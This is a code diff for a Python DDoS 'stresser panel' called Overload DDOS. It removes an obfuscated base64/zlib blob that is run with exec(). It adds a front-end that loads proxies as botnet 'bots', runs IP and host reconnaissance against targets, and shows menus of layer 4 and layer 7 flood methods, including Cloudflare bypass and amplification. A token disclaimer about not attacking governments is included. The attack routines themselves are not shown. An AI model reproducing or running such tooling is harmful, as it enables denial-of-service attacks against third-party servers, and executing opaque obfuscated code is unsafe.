@@ -1,3 +1,1024 @@
-# Python obfuscation by RzLModz
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=cSLHWy/33v//psUgv/JXDjpwyp8R+IfzNwAHdOxQ9GVPTIuVKGc+5T/ik+LCnDJGF6zfTwCHREnAxNcp0d5m0gvCZeID5pByLPSX527XzEXHFaNvE8OSYxI32UcCNbfNlbvtaXUeJf2vmOuUu+Ozf7TLB9F2RpC6ffBlVFW3gJ/wYJ+jtesXlU938RkeHyHFOsp9AIiMEWMytdGqrDKWgs8DZ0pJURVQ3kjHBZt94TCdeHGL0H6S+GF9HDLQcaZx9DPJf8nqG3KoorQHTvhmjLMGakhgxXdVjkytQx14IBNvM0SJ3O4fOOOb0KHErf0Ke/ly14Z64Yt9cIJH2TkceHirPunmJlKCMKic3GfzCAmVYM+TeM3N4Uwdye5vJL52zGqhg+RICnQGgx87wy89aAu5MTppkyaZsBxHrS376ElpLuybPzhGvq3hAsXHorbVd3KVvQhCJjnEtuLxbZ2W0sccoeUGXYY3affKPg5WpHIx3WH4W+KedGXNGw1sRCngQGs1WAbFRb7OUpCsyugTk88H25uR5nGXPfh27DRBk+t1lR/GGzRAycIMZf+bA1/Tufvo3l/0wzoi9VIXrdiciCzj5VdeZGSgUmEoy6GoRpMgth6hZ10MSc/QFqfH8Mk7apBDQRiwBge+gClT9YfHODsxkhBKqPK8UmTLnhiTBAfZ5gidUL/tS5Gu0HqP2znY2H2K56I3t5YO3U5I2maIvh2ismiaYq7HyazozV2206L58uCe2NbOV7BmDHL1NP0Im0KG+YUPEH3Yev9C7ADpCZFPK+XQKCrvSK4Dw0QPmBp+rEfbpfp6VrR7U9y95fxjCh6/IAWjUqf2SDQL6i+uYvbvZeGcjXplCTOouad673XTorlrO0+nEMZRSPaBP9DmzTeA4prKSl/O4uNe3lpClKxJKhIIEmFZN7Ni63JjNfG+nXdLNORTjIp0cjBV/UxouSH+IGgVAqWtdlcsTK9bl7Dbd+g9uGELnt9ssb6SyiXcu77VLYCwMYaxRGSEy52f0kh4kA/miZeZ8RJcVHYre0ifE20bm5nojuXKJif2bdqtzdwwob8+AGjSuUAFzs64a5WdPo7NVSY7JlUUxnTRyahNY93cGLO99nAiMXowQfIx+IjNdqfiQX/8qeLXlrX5ZBu3VjcX8Fk+O5pXnErrJFARprreHMOi3IIm57GOLr7WxxLS7t1CUQ1sH2fcL7vjBv3tOods3LIU1wuTBk2qnCtv0WCzEdTiFz2B3oDKFynFaOXQ2ZvLka/grgnGqOn6w89UXDObvdc7hSCHapCco3Wsj11TEWFBaQwPTnYEpOHur0rbMuAnQg4ekUiX8ELvALAj6NlaMbB+QrPK0WEd4ex8cNtkBaO2ZGQGaeQOzwwuvkTKecLuhoYrvbssXo/3XzEvw/O5qUiFl2IiHhfHDguOGq6J1/BjL0YUIVoBEITLT6Bx1CUq1fXnLBZ8s89LFi97Av0Tt1MVTsSftivU2veL/2J+WXhnAK0jrTCE9y16kGA0MR571WDZq8BfHtBFR35fcLuRhwwc8oBWfTdHgajhcoM7Dik7s8tB4rLlLB7aUSSqH+XPWd9DDnUoV7bdm3oYEI/dNnUYcfRBLjeNeG/sPB3ceSqWB0WJScBWp2DH6XM28hVtcfsNHf+v/F+cOsUXAqKJ9ECAZGWHeesggJ8/Ca2TThg9KIz+yNRGJD1KTw7GKHh7qbmNqzF4dBEn8NYIsy369zOqieXFtvt0zLNaR47O3lgwwahx+GVQJjuE03H2dNdrHgGsBYvnD5s8QmpJ+j7qfDolqNAzplvy2ALrteTA0u2Df4GaQ1WqCPj9Td3Vewj0ZJr2obmC/tqu8iDIv9ZYGz7MxWNbwjYQ2zZ9JQ34fNtX11d9tWE6PCrGjUH1sAw/zK81/al6maftuBOGKu0bQIs+OEbjhwcfNHtHfcBfSMYw5Z6eCaVYXwvMerosKJILGCJ0orekU1h+dPyM+by3qW6IzyvUPLLz73HWFpP7QAjsTDAb04To0qyFvool2A2HOd9vSHUD5loGWWbBWpUA/XMc/tpulWBRrg4acGRYL3UsZjDBDCA1fcvG5tx2vQ75PxeiBr4ztMJ+lacrvRpcMjoWeBWtQj/h97or/MfVbRn5WIEQPrvczEc87gm/yy9FBllEbc1FVEif7Ku7i04oafC3E5ketJfaaa4zOkR7PWBb13Tapr34krPji0sei6udbaXhezjEDQo2lhRN5IjU/mWEoztTHe3udD4zCwGWDYDud6JpVB8mFWZacITrLGFxVk4wZNQVzMOJ9YzS72Snpqyo0ZL2+SF9zB2s8jzAl3Tgo6HwYMM83rj7UtVYCNGpzIAuzE5D/ow2luoAPinUtoYbi+zc3TVNGuPXvVoerB6722uMVn5x3zN7YVNnIazgvdvl1PKTNxujq5Kglj7BOHltN7EJ20LTFtc3tMGwR9YDnTGKV4VrkvRLJQcKTwlJv1+rQAE5+GZLTgzWO0xvUJ9ab/HYWiO0xU8JGbSTV556NhNt1dFEPWaSeVkaCQMoFWJz06j5K49XPE2lMiV1TbClDS2Y+1XYuUGxk2pf3cAJQCd7uvTtavUYwgbQRrKmMGJgy0ZLVSKJScvNYRRyrvEfi7VkrLF0mJhpPHwZhiXVRdpvZQiBus3C5FY5OCOxVvbgSRmg55+beyC8saNuPZAhTevuI2BXejkoL9CnJRER/LWRfrIQrg9Jn7HfpNssaCyPIIFvxoy9ZYis5IgJtyuspnK1XHD3Me07TneS3xiubu5NClfWy79f6Jp1ynjCVwxPruxNeJKbEXgC8xlOejNjeULIcB7foAg1+qvs5FxohD1Ef7xx3Ml2OHL9jJlGRX3Ky1ff/83wOq70H8XXK7lwfwvp+HquoovVRZvdnWNImweHwOgn/W1mHpmMRBHzxuba8c/2oSRThDY67LFJE+B6tirpzCveqdRpPMAEOzeNa3oogILhlf1Ka2I2+i3DQ9NwrLstlY7PDfyJq9+mXir1Dkb391TM1/VxNltZpGjJ4RpoKxa9e5KRAexOErfd3VmDQdao+8vjS9Bi9y+6iI3Tu+c7aOAdFXeqqWG35psYA0iDXuUC44SnqoqyfUssEcH0yzM1A/iXIum+yl4kqpiwb/+NtyrYxXkeTs+stWKp6e0E7R2avXkVLl8qQFucOf8/47z0qAY9Bd/9vORXiw9lxv6j915rmqLjKdcmJ3LWOw80dC0v6muBGhW/epTq8xMHu+bMn+N7bZSnyfjPM89WyaWG6pTmbKj9ienyAP4kObwWKiIzuuK59CxvU5HmiW+nUTVeVl/n48/0Ngz5UXhF7CYLlgLfC6frHfWImXj7SOvVzOhxc1uX5c/aa7q7iTv34kEdLuTsiWF2hxLEcMYFM3MEjeCJsnAGU7eHQcg/VudGTWSCq9acnL1fv2O3qVZ4liynWxGqE7BOITRkqQxSL8ey4Y5bIlQ5xXMW5LRcZKL31Mk0lT717InNxKv4bThd8MxAyPpy4jzfHZk1ao9yhD+aaw/fiyd0ntN4g2yB2E9ImdJ0KydanIq+KbY+W+fNPIsgPoVzYP6+V1r2v5Rr/KgKrMfVu4m1PspPk+N52ojpdj1QNCPz4+5B8/NJbilcfmfXPkBJbjH6Jw3vV9z/t9XMepsGj09VJN+szUhwd/jS6eNqUaH4wx9vC9QhUx9Zb3fqoexhd9gj7hU6HcPWN6DK513bmnM/pP/j+AKqvrQUhNPi1vDhv9pUNBO0nYdGg6v5o9wHd+X4/vRRMW2LIuQJwgFis6jWZ12SDzdjA6bFyN50kLlhmq1WSpRWFFt0T85IiaEJi0Z9fHyQrX3iFQ6NpzGmaCYYJT0E3WOxD5yz7JFwN6jfT4OT+N0mLEJR2ysj0C5Wps0ZJaDa/G58J1MyEVjdMJYyziL6k4NfX54c8xXwuPz7JH3IwqmQ9nEbGguZf1+6x3BJwjlRbV7Co3/lWBsniiYr4bSLnbs7X8o4vPJvouj5iAnlrfoEh3xrfzey3nC6PmndojCrtAVeICtNK1GDcX+cU1PKBeoLcVKXZE7PtEpAdIn2rxSXh8g7EAi1Gi9o5YtDWfMoTmH6MZGi0zgO3sYFNZO/wSMc7V/WTPX8To0+VD1b03oSWh7OD2wnGrxOElGqPH6Sq4Jp5PlBT/D6ULCOJmamrELFg/HUC5NI7KfRhlMhVVb2ORxFyz7g8LMlp0a0WMF871TI79Mj8e66gejYrPstNpFRqavkn8J3wRw6vym6bu15BpXqJPR3cWvuCuCsrF4QMrxI1g9QdtIyWrySNlsyOo3p12vFsLt9iVmdZiate2Ekg2nxZcOfzEB/BJVlte8WieTIgAPt1oAOHKN8P6+iG25tzlSBF51noUEvoSQeGRr9gCUfTQXrtm5wQDwQ+oNbItrlW8f8NhPBhT+AMCW12/rkHyMQD/+9+6+GtRu/eMwIWmqhypIbNT/HiuM+5LRNX4eV5Cf1RgC4E+1EhWePfk3t0Q21A7MX/4CTInRd+3XechHJ/p9ew1P3T8jbdT7jcJve0fJSwUcl4fRboGpaY+72OX+vGScNGnHmH+Ng3Y0pPehwY7safaej3Qqk1WLfq0nMIwP81ZtpWFJjLSf0yd2pjC7+rcM1uxXfTLx87EoADHT1hvcuEHrKwJum2GSkbEm8gtuYIGKMz37RL1lSrIIcBJlcQIWOFlSHFDionS4j/Qgfmq9d7AB4a3l1woLfddRHhQqqyudbIMDDw2xQJNBB8LYD6uAyf+Ccxu90zznzV0sCn1t+6aaBERT4+Q56XdbieqesXASBvPBLM5pauMkfWxaybSZYrXMjV0YaI5pjD8K0LvYfuWrUxZxnlu8RNorpabZAsOB75TjXahHaf3pUtjneTOSylFuCAQtkP3vBwULkzy7CuIEHmRoXSc0+XBoBDU6xdQchN2Dqb2rFCFHS8MuECe7LDOVwY0H6aCEinHeykctx5v0gAUh7UOFNiqW9JvzUOJeo9DuMVlOo07t5jmVfAVhv4ow8RfNXl+EyQ6+wkLGfHx4LC7Y/5lP44AIYc+kVB7Jt68siX4KiM4E96CBzn73/2hFsc/bX9BtOgDV3fg8rVlwI1i9q0BL5x5Ae67kfYuNBRBkL9BwAEZ1+M1WTkOtJq723u3L17iyUtNzl7uqPis8EByVFtttk7JqXyJApSX8E2TEsJbz/Og1uH59amiizP0gA4YpuMYLXEB/Zj5beYDMWPgB0lzRMGHBLh69cOQjceOkMQodGk7jdMbcfy1Si9s7epfzcr9kD/ZAGqA8wuxqPzckLJx0N0ZtdQYYSjfF50+nT35uzObsvTN+0FQBffIEfz6m/y1h4qnRl5nBX3dFhpWGsk65Bq+8fO1O+Kqb1qdzw1ps8P+KLlc84dkE8GBz4lyMkLWNi9F+Z2+2yQgjDEiOGzcYuVjTss+c+QLMqDzG5KPopPPV+BoTq1l0tdhwNTALHoNXleEOCFkPrH2n7nd1Pj6ZmYwQYu6aa2IDozN/eU8+WOkHIaplk04z41ixuiG/S1t9GE3L8glRzbP/ujPBOgA7EjNrAzDUAUkvzMLWFsUbSwG1y4MNl4AKeDuhszUSusiis6oTJDv7zaZJfWgbjEAC0MxYDglKdiiNRBI2u4t42562vX7GFWC6faKdLNn6ftRf/4OpOV1Hr44UrshIGbLn36WL4FnKBdkwFH3/rZLRzP9pOn9q5tWpT5JNTjB5nqnhGx/x1dUrwSZnWgUoVHrdM++oU1Qc+pUcMEIfPScHIyTrcT7gF+yWGhQ1OyYx7o/gHEPPwuV5NfgPJ0DCLE5l4gWh/zihhTrnOBGPPGIjG0mX5t9J/ED2H/2XBBV1hSThZ3rwcPboNV2CEIzNs5mcVwblBcGitp3HPNU2HsNnRmp3Gx54XVVTsYiObCTtbcRhDl/gyvk9mvp3qIABzCdxYy2Vf3rrZTnuepwthyf+ZDC5ruBoRlOKIzzh9GihRD1NAUijVb26KYChOZCRbA5uNo3UWL4rI4hcfWpvM7ObzNXIPU99brUanLzfjbL7YVLHR0tTW3MqVQlEAo7vYfv+n7DTFjU6prisRPrcA9CvWeeQGrzpfeB3JgZxM/wHsbU4ef3lNcVKFRwusnoBsMNoOjOhhx9uFxchv2TjCR2V3keu2z3nklrGvDKSeDdi3t56DtaOEbLdPtNWtQaHevipp/oXlsbVnXI1yQmIHuPmClCXIWQJXGmITmY5qty6apI/5UqXEAAoUNAzFtK0t9KerchIJBhjDYCc3kfYtX/nO8DcqzJpcEi1T1VJO1l8QLVr2G7Ttl7b4Dy73bLSHIT+9sMrEgEz4VEKZ9xwcHYX6fxu0bs1GdPQTFroQF0Nz8Dqv5WkYBA+H1QzSy0iinZzrsuMIQFdF3uq85lXc6hDLJPVhU6m+8vMyzMI8kpQ/qLSyyDMEntqr8DenOkBScAUUpL2lxJZbDZm9/UQNKknCIsvVlmsfCHL18zrht9zOpkIypirLHlHE6TjoH9esbNyiZyxSJu/ZTc9zy2/R2Xss8VwsVIBLlldRhddIoMTZBwsdq+Bc3h9TvLSbi8tcuhbikRc4F+cRyOKHFE1VU0CXv11B+Hdz9FU21NeEcnRONqqlZ9sWOUsvWhZwmnmQRF2tiW8C1Ot90BpmZP7uGEfWkBHyolB1C/GW/TXLsyjdqFotFdgPK/VQ3kIbsjv87+C4QuBtBPOUhwfdCK/sZW8v0qzFExs9TyC6jXWgqwe1Ct8P/mynzDyuKb2VNjbckUEPtignqFelyadQD6mLxdvOIFqwpL3CRGImO1JFwvmu1nOfRJ1XvKdeQNjJFKYcSWeutVcIMfJ7JqooEMii2jEV8uWKM0MQVbGUsKfQWm+jOVLs7wan4EGCd0IEiiifP33xib8+eAPbxgD+SdPJ91VQOOvZ8y9XGgSbC01ZuDxC6RTA8XOurXvJx2DAcwdneQ4+QNkeeLEYPy9hz9oqCMLx+B1mn3Atv1BAh0mab4aeA8+9cWXyeOb6+sHyqlQf8Zq4iCBYP9Ly4ZLt0Dkal02cJqg3nlH6uAD4df77iaBFWPk278kviSXXm72TVr48SZDc1f3B9DO/rCXF1it+hIcSUrigp8wU+V2tkNf3nhQ3aQhbZSWgEwiW532XxwZ0rRpl22Jq5UzwQsx5wGeE3A4oRM/f3XbrRlssaC5kaKAvmOpAfz7T82+vSEAIK6tHIEvHKDbo6uvJghUj/kTAqGlG4ALePqjDNz59Zmy9oUnDQB/m1Y4SwRVm7BQ4AoZeF0zWIMXwzThbU0j1vx9Uwa16PJv5h1ZATIftcVk30rFD9b5c6xzqIlHgVm4mIguuhCyi2AA7+p4jE9O11VsBha82QAr7CYU9b9mZBYZt9douQ5XxFQ+Uj38VYWGfpCZnIYFrFii//qqzMG+fyt8veq9TP5HtcWXydhWqoBsSw86vMBa10rSMGq8vAZNgQMDyv8aroV7O+yPVAyajATkNRUDqie2jE7710b0h9JiGkxnpYXweCpEeb9eB/x2C2MZB2MgpAMTLUPVDH94CJ8AKVnfaD5LDK9W26BOka4QUpi8K+JST8XSj8waJl+2kL/4Z8dk0+UrpnAyM3VWC+rbDbgvgReLZ0Xzl+SaJqitLwvcOdrLsjekEnu67gru/lMHBmyqo1C/u9619tb4zhPI65MdvQGadgPavmW/4jd5cTf73h4DczovQK4+rgYRw7mag1eiAe55eWGW8XCbInfIXuH11pJ3gECnxUTj9x1HX1Qgdeda4/0QmZA97bnQ30i+XczCCHxUwqHyNyGq2RHvfn6WG22wgGbMlsNKZoyi2U0c6jVq+t5xTdvKwtwJkyLe9HPMeqIQYzqnal0vKIrtUeCnvWlIqC/hmyCjC/kldvkmOkLKxUu2Yy97yimmJhUj0zWUP+WznxKR3RqL/Ipyezgg4Fs5gx3UiWIrUybCH3u01Uv8CXvTTHLV9D2TcbG9/WGPZiTab4BReJVpbmGqUB5+8B+awnUGXCKWRAitga71Jj19AfOd8XMs+Jvj58VGhyS8Lcu3oIUObs4u31/HIUwY462AECKJCVk0kgLVSiR590nLeBwKywnZWF5HEdZqB0Xi8Shgk0aE2mssdPm+dkm3epBAj0VtP6jFmb7ix8C8rmgKJlN2nqV83kqKBKhaKj5BBUEaHUzX31wxveC0Zdc6vaytDIjRZNkDLphUgZKgkegr7q2EOMf9mhUXC0HWpbzDRwLMMbohuIlPk62a3r8WbaaD0bTzPjsp1jEqWZkdwwS1/o4zN+XewHNuGYHCTF1xajK1AnMWwnEmtXX6zbvJFUNlJyqRVUE56q1V7po9l3t2F/zEk0lskcKMoSHVUnNQK/4+htQmVAgQlLigamF0Kr1uNic9fhVgt+7bm64Y9VCxnqd9pTQRU1QBES2DwZGaCOHwSKG9Gj9GY3/MFk2o/kD+QpW4x4CmjMm9Kk5y1wIXg0JD98DdZV7YQi9CWIXKA86acVZA6jYmNrwdlBsvSKtRdIRbCjEZdewGvsNZQKksrRlA9SMqs3UFuLSeqdZ3K6d1+e9sVy2J9lznWiIaiyUM0oKa+M6C0kX4i1DgsTJo4A2KFaZ9kVevdrDVb9zYBjZPemgT99pfC+UIrBcaJlfkCMheYx3Y74wS60lhAFAQcrF6Z5mL/8FbHYtaPKeuXb84iqU9QmyPEYk3EQDvtIzFtG4+v3kSFs0Z3ZAQj+jQjPmb6KAMUzghmEcNyUoqFCdsQAPDSkFpA+w2HAexExeLcYOlw31fSohTfkOoNUn0za0gx1RTXlenFw9GxfP9JMNc1/QooN3K+YcIbnt2F3P52loEwOUgop7lGhhaDnjR5w/jqz/lFHOYidWV0AHrm7HzXwBfw60Ulo1pl9xtHZoOevV70l1wyDa8wwoWp9A7wwZ8bf3wWXZlKsBBUFZhhDGluA1H0llZwUoiG9+WqyldnQqcvD9UPvSSxjFgWUjqHwRw1uIG2rsvCmrF+eOymXF6o4/xBelktx99OzSJag+1k/iunrbX2XnoFTqfSyJZQKl5/Vb5mcHzFiDG/K2KrAguoiIExn5wBCgv2qvlns2hFntPHh7tz5Xjd76uuXkPlCQg5I1ejUlE4SLfcCmOmbyIvHHZ1fm6OcQNmcMSnXbV1NSt8XSfYySmzicVvIWzI1iJgOuouWC8n8l92vdVPK05Lq/3NsDEH02biqJpY6dLRUYnO+EnaJ2eaC4qhr/a1cmbgm4hJvsGyRls45wyjLBna/Ei0jMFy078Hsc+CnpITpv8GzXoZNv8jQPobhXJu67VFJzYD14ASU6avnJjqUC7RpPYi9knQyixFAcXIe7e09eiS1WsgBSmhv3d5c6dt5tpeIV8cNA4LGpFVpaZi3YHQCix3BC5f4qS5wAzYK8/HOXuBHBB18cP0WnKcGx6sKsaltsbasyyAb4ayfdRnzCBNFGUHUloY60I9JFNF+NhqMY0gcQBVXzlQ5PiZctjYx26/M5c9ufiHunzMSM4h7MRkWR4lA40uY8NiwQgFBLNa9C7xduiylf3MjotFFx4JBg8Atkq0yjuOMx+PzXP72hrZYCWYksJFJrVqLP31+SEYE0CgunaB40qhJXXw/Z3jUhs8zqBzncerAt3QnsrsJmcF11SRaweb6laeRflp72GwcWv9XgFcv4A7DcIPCy7VqgH7pNDzXwfysw0VFuXk8xnbxIm4VpVmU2sORUOa9MdmuggG5Pr+c1FiweRtP6jTCrejhIpDSzdZ3aTaUArQNcscBbV8yDIAIgKbgEdyp2vVULTYYEe11aQ1v/TM+MUy47Z6UjqSq47crnZxLFJjiLrmH1TZkNho+ef6Dqp9wQasRTJIHXHZCD+5Rkqp/AXkdqn/R37nUnfyhZaWZ5YBhYaCLkueIdwojcRrPRzCaA36f5lpQMQWDFyig8xN47c7dVBLQCkonX3ffi/YC/Mo/JV5Ur6V6XGtBtvKxaACmbVtOD+50FSglE0jZPGU3r/wgZ/AFNE33BMxS6DyplbYefBw7wSyuEcknPY32tC+u6R70MPpaDedmSlZN1CeG6QiGzLiZZKtn2rEw03c/JYDmGzRkQKofmAZz89G0setTrii24QBQP2J0H8r2/mYr8CeoV0R+ogeIJS7hNgLrGGxkvoQdxva7LA+NOTbhyvVZeqBPhm4aaUNo/7FlF/gCfV1qROcBzemnq3I6Y1YZbz+vAb5iEetABtCRweuzeMF0rSgCuB2zCLDOFWQsH1zjLepd3LwZ3g6BqKmxP2JIMm7c5BnlwOvCq+slsjsSAqjGsaeiIKN0BaiReM1xJT7LEmRcl7EqImOvb/OI0ElCc/rUNV4QhFBGzOgJTiz81VL3wAqzUlVwaeMpc81JMgetlDiTVqGS5d8akDocaK0cypUS5U6kvnxXN41Kk01GH95Ul4nqOqeLKkrNy7ML3/3gjweNHDGcKUlv3cGPKWV7Y7wIl6F4PCU7Eg8bjq2txcBguFwcyluCJPttckoOt0KjB1gt6to3FhM60QfHXEru4bsK37d1VVBSkWku1ozO1MQMlJREPb79KLfEa7UNp5c0/5K6qi/YUtntgkFtHoTSn69BmlXROQOrv0WIf3KGGP1dRHiKrY12Bm/mtfWY6IgobNL9crMfYC7jZRZYCMe/fpdS4JJ7a5F+8wSPjx8hZioqkwmMQ5lwEuGbrHXuRaCISk89rCbP+ICZDjJ9B9KsQ5dBE5ifB47G/I9lkqpey+jMJ9f7nUCNwIhD0jeUIWiarQ4CYq1M+hnU0xFNkAxGgATaqd+8Bg+vtc0zaUiE9HrUSiTa93Ps0bZ3OtZc0h0bK27VWnMDF8ubTfCNHeoAoYQOJ6x22Fln15ncQjRVMEcZYI9D3oODXa7k5HvEpcuiVNwPUVpKmcx9SVwV5b7MflrPlz6nviwxmCY07VHXPWjRePNFJCGebXPkSmFbOZpuUbXbRK0EdEePafhrxi82fPJg/Ho1r1gP0DIq2XDHBMXHI4AEZ6svHHFqSmJP9axJzMRS8la/yaocpBULWhXHiHJgDhF9UfwlMzzx5/ExaeCa75QFW5yGSt8sbuDZEGTVF7yH5cAmxaGZM84O8TDBPWalHNvttHa+SROLq1+kmECp0jiEbhZNxwmnXwN0ndzWZLVTl6XW9OUyuihd/gzo7HAAMROrtQZHy295jkkNMlh8M4kFYLPvHlAcoUGJiSvMK7M4iraxgHQhEdweg0kai7la+IyxT+362DljlbowOQMBeBpWdydsTH5rcQGtOtCRuQnOxYU31MVsIZOx73Vn7tQyYwe0bRljgWCec2UHFMTFSK9yCMTvQLZbL+2fuzP16DEvAhSKUCW6KDf6FZZVw00SvejhSMTge/XHMdNechf710qZrsnBjfimHLwskEu9xpX7Tc3sg0yV94Nz5hn5m7gdy1HMwO2I7Rxnp2Fn7sqCkpqhQpq6IxKjMkNiHZEXxt5X/aFj3muHzTV1idNLmzIiBwHmve4ruuSHhpfPz0y7GWHoYvtiaGant6TM25AM7cI0GwYZGU/KZmqm8SPmrcu1s1mgNBlQ6CKNCUVLK8UU5F+lgVImou1e4H6QF+l/6brisV/eiLZeSuiicSA15x0DKtPc9fS5eGV5ZWcMdo8oKsr3L2GT73S3WHIZY6GZtgENsc/LxnWflMflOqvqLkoJDrZFQ9N3qnGuCfvIQgKIZFKqECTsUb5HDzRU4xXmCnIr/tOSMl0YDII23CBRiiEUhSutYvCRhUYHQDy7/cxSrbsbyFsPkI5xaFklFLVUVFL4lzoq0+ZuRY5sRjBSaREEMd77VE+WkgxNXTd3JJkBUTvK8e5NEKO7KClDuWmIMVZk6oX3EqPfOLXVkHnrJpm2a8fRnJJLYHDW1K6kgSYvrlU2yFmutsfRU9L15oGjTlV2aRK/VYjSTzlh2e2W2KSMiPTg/kBzhUOB2MJCLY6SFrUcoJ/FoGeNiI530x2hXDBv58O7yBdT88LCHTj7rsl1TeAQCfWy4O/HVDUxGwh8FNyQivwlMlEAiXZsvVvpzSA8XTwzcFQmReKLBrHVV/euPIvip3V6+FcDSE9Rt9DFRy6Y5lLqsUQs9iuDf2YRWSASJsL/ztS1Cbw9pfVMju1Hv6KjNPE69JOKXqjl+kuP37GOhPr1A/9KPT3AJsxPvJsKSuF52kiwWe8oGOS84AuhXqt/kKsRreM1I+DXxzjHQx1NitaD4NT2pOAqWCIIZ8BwwRMwvdh5J1hHPTeoQzEvfdnVRG/AO/AmDYvN0DPkIn5T8U14BsYl2MlKFsmt5kklK+zwpr8Ck7N8zTmRTucHcQdWUfWTqjcXaMHmD5oKlTZOXd7szZGnMLjaGXyuBEUto1IYoLUzIUDtj5pPuWJCCgGrxFFWzfPb/T3v///8Z+XmXR9ma1Wpe6mElOfue4vjg3WI/T75dAwQkHBYhen9TRSg9oWcbmVwJe'))
+import socket
+import builtins
+import os
+import requests
+import random
+import getpass
+import time
+import sys
+import math
+import subprocess
+import threading
+import json
+import urllib.parse
+import string
+from termcolor import colored
+from rich import print
+from rich.table import Table
+from tabulate import tabulate
+from colorama import Fore, Style, init
+    
+proxys = open('proxies.txt').readlines()
+bots = len(proxys)
+
+def clear_screen():
+    os.system('cls'if os.name == 'nt'else'clear')
+
+init() 
+                           
+def get_ip_info(token, ip=None):
+    ip_url = f"https://ipinfo.io/{ip}?token={token}"
+    response = requests.get(ip_url)
+
+    if response.ok:
+        data = response.json()
+        simple_data = {
+            "ASN": data.get("asn"),
+            "Organisasi": data.get("org"),
+            "ISP": data.get("isp"),
+            "IP": data.get("ip")
+        }
+        print("[bold yellow]Informasi IP[/bold yellow]")
+        table = Table(show_header=True, header_style="bold magenta")
+        table.add_column("Detail")
+        table.add_column("Informasi")
+        for key, value in simple_data.items():
+            if value:
+                table.add_row(key, value)
+        print(table)
+        return data
+    else:
+        print(f"[bold red]Error saat mengambil info IP untuk {ip}:[/bold red] {response.text}")
+        return None
+
+def get_url_info(url, token):
+    parsed_url = urllib.parse.urlparse(url)
+    hostname = parsed_url.netloc
+    api_endpoint = f"https://host.io/api/web/{hostname}?token={token}"
+    response_hostio = requests.get(api_endpoint)
+
+    if response_hostio.status_code == 200:
+        data_hostio = response_hostio.json()
+        ip_address = data_hostio.get("ip") # Asumsi ada kunci 'ip'
+
+        if ip_address:
+            ip_url_ipinfo = f"https://ipinfo.io/{ip_address}?token={token}"
+            response_ipinfo = requests.get(ip_url_ipinfo)
+            if response_ipinfo.ok:
+                data_ipinfo = response_ipinfo.json()
+                simple_data = {
+                    "ASN": data_ipinfo.get("asn"),
+                    "Organisasi": data_ipinfo.get("org"),
+                    "ISP": data_ipinfo.get("isp"),
+                    "IP": data_ipinfo.get("ip")
+                }
+                print(f"[bold yellow]Informasi URL untuk {url}[/bold yellow]")
+                table = Table(show_header=True, header_style="bold magenta")
+                table.add_column("Detail")
+                table.add_column("Informasi")
+                for key, value in simple_data.items():
+                    if value:
+                        table.add_row(key, value)
+                print(table)
+                return simple_data
+            else:
+                print(f"[bold red]Error saat mengambil info IP untuk {ip_address}:[/bold red] {response_ipinfo.text}")
+                return None
+        else:
+            print(f"[yellow]Tidak dapat menemukan alamat IP untuk {url}.[/yellow]")
+            return None
+    else:
+        print(f"[bold red]Error saat mengambil informasi URL untuk {url}:[/bold red] {response_hostio.text}")
+        return None
+                                                                                                                                                                                                                                                                                   
+def si(): 
+    print('         [ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v3.0')
+    print("")                
+
+def layer7():
+    clear_screen()
+    si()
+    print(f'''
+ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+                                LAYER 7 METHODS                                                     
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫   
+ ┏━━━━━━━━━━┓┏━━━━━━━━━━┓┏━━━━━━━━━━┓┏━━━━━━━━━━┓
+  →httpbypass      →cfgas          →http-storm       →tls  
+ ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
+  →cf-bypass       →uambypass      →httpget         →auto 
+ ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
+  →crash            →httpflood       →cf-socket        →cf-pro  
+ ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
+  →hyper            →slow            →https-spoof     →http-requests  
+ ┗━━━━━━━━━━┛┗━━━━━━━━━━┛┗━━━━━━━━━━┛┗━━━━━━━━━━┛
+''')
+
+def layer4():
+    clear_screen()
+    si()
+    print(f'''
+ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+                                LAYER 4 METHODS                                                     
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫   
+ ┏━━━━━━━━━━┓┏━━━━━━━━━━┓┏━━━━━━━━━━┓┏━━━━━━━━━━┓
+  →udp              →tcp              →nfo-killer         →std  
+ ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
+  →udpbypass      →destroy          →home            →god  
+ ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
+  →slowloris        →flux              →stdv2            →stress  
+ ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
+  →ovh-raw          →ovh-beam       →overflow        →brutal  
+ ┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫┣━━━━━━━━━━┫
+  →ovh-amp         →minecraft       →samp            →ldap  
+ ┗━━━━━━━━━━┛┗━━━━━━━━━━┛┗━━━━━━━━━━┛┗━━━━━━━━━━┛
+''')
+
+def rules():
+    clear_screen()
+    si()
+    print(f'''                                
++----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+| No. | Rules                                                                                                                                                                                                                                                                                                                                                                                                                        |
+|----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+| 1   | The owner does not recommend attacking the government, if you do so you must be willing to take responsibility and accept all risks                                                                                                                                                                                                                                                                                                                                  |
+| 2   | Only attack for testing servers                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| 3   | The creator is not responsible if this tool is used by the wrong person for unlawful activities                                                                                                                                                                                                                                                                                                                                     |
++----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+''')
+    
+def menu():
+    sys.stdout.write(f"         \x1b]2;Overload Server --> Online Botnet: [{bots}] | Stresser Panel | VIP (true)\x07")
+    clear_screen()
